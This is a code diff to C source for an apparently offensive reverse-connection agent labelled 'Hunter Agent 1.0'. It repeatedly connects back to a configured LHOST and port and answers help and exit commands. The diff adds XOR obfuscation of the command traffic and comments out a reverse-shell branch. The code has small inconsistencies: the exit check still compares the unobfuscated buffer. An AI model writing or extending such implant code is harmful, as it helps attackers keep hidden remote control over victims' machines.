@@ -4,7 +4,7 @@
 #include <string.h>
 #include <stdlib.h>
 #include <sys/wait.h>
-
+#include "helpers.c"
 #include "payload_common.h"
 
 #define MAXBUF 65536
@@ -14,6 +14,7 @@ int main(void)
 	int connection_established;
 	char* ip = LHOST;
 	char* key = KEY;
+	int keylen = strlen(key);
 	int port = PORT;
 	int n = 0;
 	char buf[MAXBUF];
@@ -28,18 +29,24 @@ int main(void)
 		connection_established = connect(sock, (struct sockaddr *) &sa, sizeof(sa)); 
 	} while(connection_established != 0);
 
-	write(sock, MSG_HELLO, strlen(MSG_HELLO));
+	char* xorhello = XOR("Hunter Agent 1.0\n", key, 17, keylen);
+	write(sock, xorhello, 17);
 
 	while (connection_established == 0)
 	{
 		while((n = read(sock, buf, MAXBUF)) > 0)
 		{
+			char* xorbuf = XOR(buf, key, n, keylen);
+			printf("Buffer is: %s\n", xorbuf);
 			// TODO: Revamp argument parsing (there's a better way! :)
-			if(strncmp(buf, "help\n", 5) == 0)
+			if(strncmp(xorbuf, "help\n", 5) == 0)
 			{
-				write(sock, MSG_HELP, strlen(MSG_HELP));
+				char* xorhelp = XOR(MSG_HELP, key, strlen(MSG_HELP), keylen);
+				write(sock, xorhelp, strlen(MSG_HELP));
 			}
 
+			// TODO: Make proper shell agent command
+			/*
 			else if(strncmp(buf, "shell\n", 6) == 0)
 			{
 
@@ -65,16 +72,18 @@ int main(void)
 
 				write(sock, MSG_EXIT_RSHELL, strlen(MSG_EXIT_RSHELL));
 			}
-
+*/
 			else if(strncmp(buf, "exit\n", 5) == 0)
 			{
-				write(sock, MSG_EXIT_CMD, strlen(MSG_EXIT_CMD));
+				char* xorexit = XOR(MSG_EXIT_CMD, key, strlen(MSG_EXIT_CMD), keylen);
+				write(sock, xorexit, strlen(MSG_EXIT_CMD));
 				exit(EXIT_SUCCESS);
 			}
 
 			else
 			{
-				write(sock, MSG_INVALID, strlen(MSG_INVALID));
+				char* xorinvalid = XOR(MSG_INVALID, key, strlen(MSG_INVALID), keylen);
+				write(sock, xorinvalid, strlen(MSG_INVALID));
 			}		
 		}
 	}
